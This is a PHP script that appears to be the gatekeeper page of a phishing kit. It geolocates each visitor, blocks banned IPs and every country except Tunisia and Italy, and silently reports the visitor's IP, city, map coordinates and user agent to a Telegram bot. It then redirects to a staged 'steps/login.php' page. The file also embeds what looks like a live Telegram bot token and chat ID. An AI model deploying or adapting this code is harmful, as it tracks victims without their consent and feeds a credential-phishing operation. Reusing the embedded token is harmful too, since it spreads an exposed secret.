<?php
// === CONFIG ===
$botToken = '8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s'; // updated token
$chatId = '-4932499123'; // updated chat ID
$bannedFile = __DIR__ . '/banned_ips.txt';
$redirectTo = 'steps/login.php';

// === GET USER IP ===
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$ip = getUserIP();

// === GET GEO INFO ===
$details = json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country,regionName,city,lat,lon"));
$country = $details->status === 'success' ? $details->country : 'Unknown';
$region = $details->status === 'success' ? $details->regionName : 'Unknown';
$city = $details->status === 'success' ? $details->city : 'Unknown';
$lat = $details->status === 'success' ? $details->lat : null;
$lon = $details->status === 'success' ? $details->lon : null;
$mapLink = ($lat && $lon) ? "https://maps.google.com/?q=$lat,$lon" : 'Unknown';

// === CHECK BAN LIST ===
if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES);
    if (in_array($ip, $banned)) {
        header("HTTP/1.0 403 Forbidden");
        exit("Access denied (banned).");
    }
}

// === ALLOW ONLY TUNISIA AND ITALY ===
$allowedCountries = ['Tunisia', 'Italy'];
if (!in_array($country, $allowedCountries)) {
    header("HTTP/1.0 403 Forbidden");
    exit("Access denied (country not allowed).");
}

// === TELEGRAM SEND FUNCTION ===
function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    @file_get_contents($url . '?' . http_build_query($data));
}

// === SEND TELEGRAM MESSAGE IF TUNISIA OR ITALY ===
if (in_array($country, ['Tunisia', 'Italy'])) {
    $time = date("Y-m-d H:i:s");
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
    $ref = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    $message = "📥 New visit from $country:\n";
    $message .= "🕒 $time\n";
    $message .= "🌐 IP: $ip\n";
    $message .= "📍 Region: $region\n";
    $message .= "🏙️ City: $city\n";
    $message .= "🗺️ Location: $mapLink\n";
    $message .= "📱 User Agent: $userAgent\n";

    sendToTelegram($botToken, $chatId, $message);
}

// === REDIRECT TO LOGIN PAGE ===
header("Location: $redirectTo");
exit;
?>
